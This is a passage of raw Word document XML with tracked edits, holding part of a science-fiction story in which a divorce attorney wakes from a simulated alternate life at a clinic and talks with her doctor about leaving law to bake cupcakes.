          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">! Not yet! Let your mind </w:t>
      </w:r>
      <w:ins w:id="3190" w:author="TextVet" w:date="2016-03-29T14:06:00Z">
        <w:r w:rsidR="003D568C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">return </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3191" w:author="TextVet" w:date="2016-03-29T14:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003D568C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>come back in</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">to your body.” The woman’s soft voice was </w:t>
      </w:r>
      <w:del w:id="3192" w:author="TextVet" w:date="2016-03-29T14:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0086707D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">simultaneously </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">soothing </w:t>
      </w:r>
      <w:ins w:id="3193" w:author="TextVet" w:date="2016-03-29T14:09:00Z">
        <w:r w:rsidR="0086707D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>yet</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3194" w:author="TextVet" w:date="2016-03-29T14:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0086707D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> authoritative</w:t>
      </w:r>
      <w:ins w:id="3195" w:author="TextVet" w:date="2016-03-29T14:09:00Z">
        <w:r w:rsidR="0086707D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3196" w:author="TextVet" w:date="2016-03-29T14:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0086707D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, like</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a wise matriarch</w:t>
      </w:r>
      <w:ins w:id="3197" w:author="TextVet" w:date="2016-03-29T14:07:00Z">
        <w:r w:rsidR="00406939">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 “We’</w:t>
      </w:r>
      <w:ins w:id="3198" w:author="TextVet" w:date="2016-03-29T14:07:00Z">
        <w:r w:rsidR="003E674C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ll</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3199" w:author="TextVet" w:date="2016-03-29T14:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003E674C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>re going to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> take off your goggles now, alright? On the count of ten, nine, eight…”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pale glowing nothingness lifted away, and her eyes regained focus. Before her, she saw the warm, kind face of her clinician, Dr. Natalie Rosenbaum-Braun.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“Your name is Alyssa Crawford,” Dr. Rosenbaum-Braun </w:t>
      </w:r>
      <w:ins w:id="3200" w:author="TextVet" w:date="2016-03-29T14:10:00Z">
        <w:r w:rsidR="00C2033D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>assured</w:t>
        </w:r>
        <w:r w:rsidR="00986DFA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> gently</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3201" w:author="TextVet" w:date="2016-03-29T14:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C2033D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said in that calming yet powerful voice</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “You’re a thirty-one-year-old divorce attorney in New York City. Right now you’re in Seattle, in the Life Choices Projection Clinic…”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the doctor spoke, Alyssa slowly grew aware of medical equipment surrounding her — glowing displays of jumpy lines, transparent plastic bags of fluid hanging from metal clips. Nurses and technicians scurried around her, making announcements such as, “Prefrontal suppressors fully drained,” or, “Melatonin and GABA levels both back to baseline.”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were in an induced REM-like state for just under two hours,” said the doctor as she removed tubes from the back of her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Alyssa gasped. “It… It felt like </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>years</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w:t>
      </w:r>
      <w:ins w:id="3202" w:author="TextVet" w:date="2016-03-29T14:12:00Z">
        <w:r w:rsidR="00986DFA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ell</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3203" w:author="TextVet" w:date="2016-03-29T14:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00986DFA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>alk to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> me about your experience.”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Alyssa struggled for words as reality </w:t>
      </w:r>
      <w:ins w:id="3204" w:author="TextVet" w:date="2016-03-29T14:13:00Z">
        <w:r w:rsidR="001E2376">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>dawned</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3205" w:author="TextVet" w:date="2016-03-29T14:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001E2376">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>returned to her</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “I… I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>knew</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> it was a simulation the whole time. But it didn’t matter, y</w:t>
      </w:r>
      <w:ins w:id="3206" w:author="TextVet" w:date="2016-03-29T14:13:00Z">
        <w:r w:rsidR="00DF0BDA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3207" w:author="TextVet" w:date="2016-03-29T14:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DF0BDA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">ou </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">know? You ever have dreams like that? Where you know it’s a dream, but that doesn’t change how </w:t>
      </w:r>
      <w:r w:rsidRPr="00DF0BDA">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3208" w:author="TextVet" w:date="2016-03-29T14:14:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>real</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it all seems at the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>time? I came up with such a great recipe for a spice-infused devil’s food brownie… I… I’m trying to remember it now, but…”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Dr. Rosenbaum-Braun doctor smiled kindly. “Let’s not fixate on that. You didn’t </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>really</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> live through several years in the last few hours, after all. We just alter the way your brain records memories, to make you </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>remember</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> it as though you did. You can’t actually learn new skills or produce creative works while you’re under. If you wanted to become</w:t>
      </w:r>
      <w:ins w:id="3209" w:author="TextVet" w:date="2016-03-29T14:16:00Z">
        <w:r w:rsidR="00AA295B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, say,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a piano virtuoso</w:t>
      </w:r>
      <w:ins w:id="3210" w:author="TextVet" w:date="2016-03-29T14:16:00Z">
        <w:r w:rsidR="00AA295B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3211" w:author="TextVet" w:date="2016-03-29T14:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AA295B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, for example,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> we wouldn’t squeeze decades of practice into a two-hour augmented hypnotherapy session. But the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>effects</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of having those skills — the impact on you as a person, how they would affect your perception of yourself and the way you interact with the world —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part can teach us something. Let’s expore that. How is Maine Cupcake Alyssa different from who you are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Alyssa caught herself laughing. “Doctor… Real-Life Me works with people </w:t>
      </w:r>
      <w:commentRangeStart w:id="3212"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>that</w:t>
      </w:r>
      <w:commentRangeEnd w:id="3212"/>
      <w:r w:rsidR="00E47BE8">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="3212"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> are literally going through the worst time of their lives. They’re hurt and bitter and vindictive. People hire me to stick it to their soon-to-be exes, or justify their cheating. It… It gets so ugly. But </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>in there</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, I made people </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>happy</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. I could </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>see</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> them smile before my eyes. And… I had no idea </w:t>
      </w:r>
      <w:del w:id="3213" w:author="TextVet" w:date="2016-03-29T14:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008D06FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>something like that was missing from my life until now. Sure, I mean, it’s just a cupcake</w:t>
      </w:r>
      <w:del w:id="3214" w:author="TextVet" w:date="2016-03-29T14:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008D06FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3215" w:author="TextVet" w:date="2016-03-29T14:19:00Z">
        <w:r w:rsidR="008D06FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>…</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3216" w:author="TextVet" w:date="2016-03-29T14:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008D06FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> It’s just</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a fleeting moment of pleasure. But it’s </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>real</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> pleasure. I don’t know; maybe I’m doing more overall good in the world where I am now. But… maybe </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> don’t have to be the one doing it. It’s not like Manhattan has a shortage of divorce lawyers.”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Dr. Rosenbaum-Braun coaxed her to lift her head, and removed a flexible cap of electrodes from her skull, carefully separating it from her hair. “Let’s not be too hasty. You shouldn’t make major decisions after </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>one</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> treatment. Eventually</w:t>
      </w:r>
      <w:ins w:id="3217" w:author="TextVet" w:date="2016-03-29T14:20:00Z">
        <w:r w:rsidR="004F5581">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you might decide to practice a different kind of law. Or take on some volunteer work. Or</w:t>
      </w:r>
      <w:ins w:id="3218" w:author="TextVet" w:date="2016-03-29T14:20:00Z">
        <w:r w:rsidR="004F5581">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you might change nothing — at least, not on the surface — but simply learn to see your current situation in a different light.” The doctor held her hand and helped her stand up. “You’re certainly not alone. Many of our clients don’t know what they want until they see it played out before them. Some </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>think</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> they know what they want, only to find that actually </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>having</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it brings them no joy. </w:t>
      </w:r>
      <w:ins w:id="3219" w:author="TextVet" w:date="2016-03-29T14:21:00Z">
        <w:r w:rsidR="004F5581">
          <w:rPr>
